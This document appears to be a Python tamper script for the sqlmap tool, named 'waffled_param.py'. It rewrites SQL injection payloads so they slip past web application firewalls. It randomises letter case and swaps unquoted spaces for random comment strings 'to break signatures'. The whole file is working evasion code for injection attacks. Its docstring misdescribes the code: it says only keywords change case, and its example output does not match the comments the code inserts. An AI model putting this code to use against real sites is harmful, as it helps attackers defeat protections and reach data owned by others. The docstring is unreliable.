
#!/usr/bin/env python

"""
Custom Tamper Script: waffled_param.py
Implements random case and space-to-comment conversion.
"""

import random
import string
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Randomizes case of SQL keywords and replaces spaces with comments.
    
    Example: 
        'SELECT * FROM users' 
        becomes 
        'SeLeCt/**/ * /**/FrOm/**/users'
    """
    
    if not payload:
        return payload

    # 1. Space to Comment
    # Simple replacement: ' ' -> '/**/'
    # better: ' ' -> '/*RANDOM*/'
    
    # First, let's randomize case
    chars = list(payload)
    for i in range(len(chars)):
        if chars[i].isalpha():
            if random.randint(0, 1):
                chars[i] = chars[i].upper()
            else:
                chars[i] = chars[i].lower()
    
    payload = "".join(chars)
    
    # 2. Space injection
    # Replace spaces with random comments to break signatures
    retVal = ""
    quote = False
    
    for i in range(len(payload)):
        if payload[i] in ('\'', '"'):
            quote = not quote
        
        if payload[i] == ' ' and not quote:
            # Inject comment
            comment = "/*" + ''.join(random.choices(string.ascii_letters, k=random.randint(3,6))) + "*/"
            retVal += comment
        else:
            retVal += payload[i]
            
    return retVal
